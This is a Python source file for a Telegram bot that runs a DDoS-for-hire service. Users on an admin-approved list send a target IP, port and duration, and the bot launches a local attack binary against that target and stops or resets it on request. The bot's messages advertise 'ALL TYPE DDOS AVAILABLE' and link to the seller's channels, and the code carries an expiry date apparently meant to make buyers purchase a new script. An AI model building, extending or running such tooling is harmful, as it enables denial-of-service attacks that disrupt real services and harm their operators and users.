import subprocess
import logging
import os
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from flashh import TOKEN   # Import the TOKEN and ADMIN_ID variables
from datetime import datetime  # Import datetime for expiry checking

ADMIN_ID = 6073143283

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Path to your binary
BINARY_PATH = "./om"

EXPIRY_DATE = datetime(2024, 12, 28)  # Set expiry date to 1st November 2024

# Global variables
process = None
target_ip = None
target_port = None

# Check if the script has expired
def check_expiry():
    current_date = datetime.now()
    return current_date > EXPIRY_DATE

# Load replies from an external JSON file
def load_replies():
    try:
        with open("replies.json", "r") as file:
            return json.load(file)
    except FileNotFoundError:
        logging.error("Replies configuration file not found!")
        return {}

# Load replies from external file at startup
REPLIES = load_replies()

# File to store approved users
APPROVED_USERS_FILE = "approved_users.txt"

# Load approved users from file
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    return set()

# Save approved user to file
def save_approved_user(user_id):
    with open(APPROVED_USERS_FILE, "a") as file:
        file.write(f"{user_id}\n")

# Global variable to store approved users
approved_users = load_approved_users()

# Check if the user is admin
def is_admin(update: Update) -> bool:
    return update.effective_user.id == ADMIN_ID

# Check if the user is approved
def is_approved(user_id) -> bool:
    return user_id in approved_users or user_id == ADMIN_ID

# Start command: Show Attack button if user is approved
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Check if the script has expired
    if check_expiry():
        # First message with your personal link
        keyboard1 = [[InlineKeyboardButton("SEND MESSAGE", url="https://t.me/FLASH_502")]]
        reply_markup1 = InlineKeyboardMarkup(keyboard1)
        await update.message.reply_text(
            "🚀This script has expired. DM for New Script. Made by t.me/FLASH_502",
            reply_markup=reply_markup1
        )

        # Second message with the channel link
        keyboard2 = [[InlineKeyboardButton("JOIN CHANNEL", url="https://t.me/addlist/WMQ6dPbJNDZkNjk1")]]
        reply_markup2 = InlineKeyboardMarkup(keyboard2)
        await update.message.reply_text(
            "📢 FLÂSH ddos\nALL TYPE DDOS AVAILABLE:-\n t.me/flashmainchannel",
            reply_markup=reply_markup2
        )
        return

    # Show Attack button if user is approved
    if is_approved(user_id):
        keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(REPLIES["start_approved"], reply_markup=reply_markup)
    else:
        await update.message.reply_text(REPLIES["not_approved"])

# Command for admin to approve users
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id_to_approve = int(context.args[0])
        if user_id_to_approve not in approved_users:
            approved_users.add(user_id_to_approve)
            save_approved_user(user_id_to_approve)
            await update.message.reply_text(f"User {user_id_to_approve} has been approved.")
        else:
            await update.message.reply_text(f"User {user_id_to_approve} is already approved.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID to approve.")

        # Remove disapproved user from the approved list and file
def remove_approved_user(user_id):
    if user_id in approved_users:
        approved_users.remove(user_id)
        # Rewrite the approved users file with updated list
        with open(APPROVED_USERS_FILE, "w") as file:
            for uid in approved_users:
                file.write(f"{uid}\n")

# Command for admin to disapprove users
async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id_to_disapprove = int(context.args[0])
        if user_id_to_disapprove in approved_users:
            remove_approved_user(user_id_to_disapprove)
            await update.message.reply_text(f"User {user_id_to_disapprove} has been disapproved.")
        else:
            await update.message.reply_text(f"User {user_id_to_disapprove} is not in the approved list.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID to disapprove.")


# Handle button clicks (only for approved users)
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await query.message.reply_text(REPLIES["not_approved"])
        await query.answer()
        return

    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text(REPLIES["input_ip_port_time"])

# Handle target, port, and time input (only for approved users)
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.message.reply_text(REPLIES["not_approved"])
        return

    global target_ip, target_port, attack_time

    try:
        # User input is expected in the format: <target> <port> <time>
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
                                        "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text('''Invalid format. Please enter in the format: 
<target> <port> <time>🚀🚀''')

# Start the attack (only for approved users)
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.callback_query.message.reply_text(REPLIES["not_approved"])
        return

    global process, target_ip, target_port, attack_time
    if not target_ip or not target_port or not attack_time:
        await update.callback_query.message.reply_text("Please configure the target, port, and time first.")
        return

    if process and process.poll() is None:
        await update.callback_query.message.reply_text("Attack is already running.")
        return

    try:
        # Run the binary with target, port, and time
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.callback_query.message.reply_text(f"CHIN TAPAK DUM DUM(●'◡'●) FeedBack De Dio Yaad se 😡 :-👉 {target_ip}:{target_port} for {attack_time} seconds")
    except Exception as e:
        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
        logging.error(f"Error starting attack: {e}")

# Stop the attack (only for approved users)
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.callback_query.message.reply_text(REPLIES["not_approved"])
        return

    global process
    if not process or process.poll() is not None:
        await update.callback_query.message.reply_text(REPLIES["attack_time_finished"])
        return

    process.terminate()
    process.wait()
    await update.callback_query.message.reply_text("attack_stopped")

# Reset the attack (only for approved users)
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.callback_query.message.reply_text(REPLIES["not_approved"])
        return

    global process, target_ip, target_port, attack_time
    if process and process.poll() is None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    attack_time = None
    await update.callback_query.message.reply_text(REPLIES["attack_reset"])

# Button action handler for start/stop/reset actions (only for approved users)
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.callback_query.message.reply_text(REPLIES["not_approved"])
        return

    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)

def main():
    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register admin command to approve users
    application.add_handler(CommandHandler("approve", approve_user))

    # Register admin command to disapprove users
    application.add_handler(CommandHandler("disapprove", disapprove_user))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))

    # Register message handler to handle input for target, port, and time
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()

